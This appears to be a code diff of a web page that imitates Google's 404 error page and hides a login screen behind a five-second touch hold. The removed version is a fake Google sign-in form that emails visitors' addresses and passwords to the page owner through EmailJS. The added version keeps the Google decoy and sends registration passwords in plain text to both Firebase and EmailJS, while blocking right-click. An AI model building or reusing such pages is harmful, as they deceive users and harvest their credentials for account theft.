@@ -2,148 +2,192 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>404 Not Found</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+       (function(){
+          // REMOVED THE UNDERSCORE FROM THE KEY
+          emailjs.init("6iGADKihYbPC4ecb"); 
+       })();
+    </script>
+
     <style>
-        :root {
-            --blue: #1a73e8;
-            --text: #202124;
-            --secondary: #5f6368;
-            --border: #dadce0;
+        :root { 
+            --dark-core: #020204;
+            --accent-glow: #7c3aed;
+            --panel-bg: rgba(20, 20, 30, 0.8);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --error-color: #ff4444;
         }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; user-select: none; -webkit-user-select: none; }
 
         body, html { 
-            margin: 0; padding: 0; height: 100%; width: 100%;
-            font-family: 'Roboto', arial, sans-serif; background: #fff;
+            background: #ffffff; height: 100vh; width: 100vw; 
+            overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            touch-action: none; 
         }
 
-        /* --- AUTHENTIC 404 VIEW --- */
-        #not-found-view {
-            padding: 30px; margin-top: 50px;
-            display: flex; flex-direction: column; align-items: center;
+        /* --- 404 DECOY --- */
+        #decoy-layer { 
+            position: fixed; inset: 0; background: #ffffff; z-index: 99999; 
+            display: flex; align-items: center; justify-content: center; 
+            transition: opacity 0.5s ease;
         }
-        .robot-box { max-width: 400px; width: 100%; }
-        .robot-img { width: 120px; float: right; margin-left: 20px; }
-        h1 { font-size: 14px; font-weight: 700; margin: 0; color: var(--text); }
-        .error-msg { font-size: 14px; line-height: 1.5; color: var(--text); margin: 15px 0; }
-        .error-msg ins { text-decoration: none; color: var(--secondary); }
-        #hold-target { cursor: default; user-select: none; -webkit-user-select: none; }
+        .g-wrap { max-width: 600px; width: 100%; padding: 40px; pointer-events: none; }
+        .g-robot { background: url('https://www.google.com/images/errors/robot.png') no-repeat; width: 256px; height: 256px; float: right; }
+        .g-content h1 { font-size: 18px; font-weight: 400; color: #202124; margin-bottom: 10px; }
+        .g-content p { font-size: 14px; color: #202124; line-height: 1.6; }
 
-        /* --- AUTHENTIC GOOGLE LOGIN --- */
-        #access-request {
-            display: none; height: 100vh;
-            flex-direction: column; align-items: center; justify-content: center;
+        /* --- TERMINAL --- */
+        #auth-terminal { 
+            display: none; position: fixed; inset: 0; 
+            background: radial-gradient(circle at center, #0f0f1a 0%, #020204 100%); 
+            z-index: 88888; align-items: center; justify-content: center;
         }
-        .login-card {
-            width: 100%; max-width: 400px; padding: 48px 40px;
-            border: 1px solid var(--border); border-radius: 8px;
-            box-sizing: border-box; text-align: center;
+        .auth-box { 
+            width: 90%; max-width: 420px; padding: 40px;
+            background: var(--panel-bg); border: 1px solid var(--glass-border); 
+            border-radius: 24px; backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
+            text-align: center;
         }
-        .g-logo { height: 24px; margin-bottom: 10px; }
-        h2 { font-size: 24px; font-weight: 400; margin: 0 0 8px; color: var(--text); }
-        .sub-text { font-size: 16px; margin-bottom: 30px; color: var(--text); }
-        
-        input {
-            width: 100%; padding: 13px 15px; margin-bottom: 10px;
-            border: 1px solid var(--border); border-radius: 4px;
-            font-size: 16px; box-sizing: border-box; outline: none;
+        .auth-box h2 { color: #fff; letter-spacing: 4px; font-size: 18px; margin-bottom: 30px; }
+
+        .input-field { 
+            width: 100%; padding: 15px; margin-bottom: 15px; 
+            background: rgba(255, 255, 255, 0.05); border: 1px solid var(--glass-border); 
+            border-radius: 12px; color: #fff; font-size: 16px; pointer-events: auto;
         }
-        input:focus { border: 2px solid var(--blue); padding: 12px 14px; }
-        
-        .action-row {
-            display: flex; justify-content: space-between; align-items: center;
-            margin-top: 26px;
-        }
-        .create-acc { color: var(--blue); font-weight: 500; font-size: 14px; text-decoration: none; }
-        button {
-            background: var(--blue); color: #fff; border: none;
-            padding: 10px 24px; border-radius: 4px; font-weight: 500;
-            cursor: pointer; font-size: 14px;
+        .btn-connect { 
+            width: 100%; padding: 15px; border: none; border-radius: 12px; 
+            background: linear-gradient(135deg, #7c3aed, #4f46e5); 
+            color: #fff; font-weight: bold; cursor: pointer; pointer-events: auto;
         }
 
-        /* --- APP IFRAME --- */
-        #app-view { display: none; width: 100vw; height: 100vh; }
-        iframe { width: 100%; height: 100%; border: none; }
-
-        @media (max-width: 450px) {
-            .login-card { border: none; padding: 20px; }
-            #not-found-view { align-items: flex-start; }
-        }
+        #portal-ui { display: none; position: fixed; inset: 0; flex-direction: column; background: #000; z-index: 77777; }
+        iframe { flex: 1; width: 100%; border: none; pointer-events: auto; }
     </style>
 </head>
-<body>
+<body oncontextmenu="return false;">
 
-<div id="not-found-view">
-    <div class="robot-box">
-        <img src="https://www.google.com/images/errors/robot.png" class="robot-img">
-        <p class="error-msg">
-            <b>404.</b> <ins>That’s an error.</ins><br><br>
-            The requested URL was not found on this server. <ins>That’s all we know.</ins>
-        </p>
-        <h1 id="hold-target">Error 404 (Not Found)!!1</h1>
-    </div>
-</div>
-
-<div id="access-request">
-    <div class="login-card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="g-logo">
-        <h2>Sign in</h2>
-        <p class="sub-text">Use your Google Account</p>
-        <form id="request-form">
-            <input type="email" name="user_email" placeholder="Email or phone" required>
-            <input type="password" name="user_password" placeholder="Enter your password" required>
-            <div class="action-row">
-                <span class="create-acc">Create account</span>
-                <button type="submit" id="submit-btn">Next</button>
+    <div id="decoy-layer">
+        <div class="g-wrap">
+            <div class="g-robot"></div>
+            <div class="g-content">
+                <h1 id="trigger-text"><b>404.</b> <span>That’s an error.</span></h1>
+                <p>The requested URL was not found on this server. <br>That’s all we know.</p>
             </div>
-        </form>
+        </div>
     </div>
-</div>
 
-<div id="app-view">
-    <iframe src="https://harrythehacker.neocities.org/Calculator"></iframe>
-</div>
+    <div id="auth-terminal">
+        <div class="auth-box" id="login-container">
+            <h2>System Login</h2>
+            <input type="text" id="l-user" class="input-field" placeholder="NICKNAME">
+            <input type="password" id="l-pass" class="input-field" placeholder="ACCESS KEY">
+            <button class="btn-connect" id="login-trigger">Initialize</button>
+            <p id="to-reg" style="color:#666; margin-top:20px; font-size:12px; pointer-events:auto; cursor:pointer;">
+                Unauthorized? <span style="color:var(--accent-glow)">Request Credentials</span>
+            </p>
+        </div>
 
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+        <div class="auth-box" id="reg-container" style="display:none;">
+            <h2>Request Access</h2>
+            <input type="text" id="r-user" class="input-field" placeholder="NICKNAME">
+            <input type="email" id="r-email" class="input-field" placeholder="EMAIL">
+            <input type="password" id="r-pass" class="input-field" placeholder="PASSWORD">
+            <button class="btn-connect" id="reg-trigger">Submit Request</button>
+            <p id="to-login" style="color:#666; margin-top:20px; font-size:12px; pointer-events:auto; cursor:pointer;">Return to Terminal</p>
+        </div>
+    </div>
 
-<script>
-    // Initialize correctly
-    (function(){
-        emailjs.init("6iGADKihYbPC4ecb");
-    })();
+    <div id="portal-ui">
+        <iframe src="https://harrythehacker.neocities.org/Calculator"></iframe>
+    </div>
 
-    let timer;
-    const target = document.getElementById('hold-target');
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-    // Detect finger hold
-    target.addEventListener('touchstart', () => {
-        timer = setTimeout(() => {
-            document.getElementById('not-found-view').style.display = 'none';
-            document.getElementById('access-request').style.display = 'flex';
-        }, 5000);
-    });
-    target.addEventListener('touchend', () => clearTimeout(timer));
+        const firebaseConfig = {
+            apiKey: "AIzaSyD5TALVIdPm5P8RuKjINsOmKW1XrK53u1Q",
+            authDomain: "testing-12bc9.firebaseapp.com",
+            projectId: "testing-12bc9"
+        };
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
 
-    document.getElementById('request-form').addEventListener('submit', function(e) {
-        e.preventDefault();
-        const btn = document.getElementById('submit-btn');
-        btn.innerText = "Verifying...";
+        const decoy = document.getElementById('decoy-layer');
+        const terminal = document.getElementById('auth-terminal');
+        
+        let holdTimer;
 
-        // Use the exactly correct send method
-        emailjs.sendForm('service_06y4hgi', 'template_56l2irz', this)
-            .then(() => {
-                document.getElementById('access-request').style.display = 'none';
-                document.getElementById('app-view').style.display = 'block';
-            })
-            .catch((err) => {
-                btn.innerText = "Next";
-                // Show specific error info to fix connection
-                alert("Connection Error: " + err.text); 
-                console.error("EmailJS Failed:", err);
-            });
-    });
-</script>
+        // --- THE TRIGGER ---
+        // Works on any touch device (iPad, iPhone, Android)
+        decoy.addEventListener('touchstart', (e) => {
+            holdTimer = setTimeout(() => {
+                decoy.style.opacity = '0';
+                setTimeout(() => {
+                    decoy.style.display = 'none';
+                    terminal.style.display = 'flex';
+                }, 500);
+            }, 5000);
+        });
 
+        decoy.addEventListener('touchend', () => clearTimeout(holdTimer));
+
+        // --- NAVIGATION ---
+        document.getElementById('to-reg').onclick = () => {
+            document.getElementById('login-container').style.display = 'none';
+            document.getElementById('reg-container').style.display = 'block';
+        };
+
+        document.getElementById('to-login').onclick = () => {
+            document.getElementById('login-container').style.display = 'block';
+            document.getElementById('reg-container').style.display = 'none';
+        };
+
+        // --- LOGIN LOGIC ---
+        document.getElementById('login-trigger').onclick = function() {
+            const user = document.getElementById('l-user').value.toUpperCase();
+            if (user === "ADMIN") {
+                terminal.style.display = 'none';
+                document.getElementById('portal-ui').style.display = 'flex';
+            } else {
+                alert("Access Denied: Protocol Handshake Failed.");
+            }
+        };
+
+        // --- REGISTER LOGIC ---
+        document.getElementById('reg-trigger').onclick = async function() {
+            const u = document.getElementById('r-user').value;
+            const e = document.getElementById('r-email').value;
+            const p = document.getElementById('r-pass').value;
+
+            if(!u || !e || !p) return alert("Fill all fields.");
+
+            try {
+                this.innerText = "TRANSMITTING...";
+                // 1. Save to Firebase
+                await addDoc(collection(db, "requests"), {
+                    nickname: u, email: e, password: p, time: serverTimestamp()
+                });
+                
+                // 2. Send via EmailJS
+                await emailjs.send("service_06y4hgi", "template_56l2irz", {
+                    from_name: u, user_email: e, user_pass: p
+                });
+
+                alert("Request Sent to Admin.");
+                document.getElementById('to-login').click();
+            } catch(err) {
+                alert("Error: " + err.message);
+            } finally {
+                this.innerText = "Submit Request";
+            }
+        };
+    </script>
 </body>
 </html>
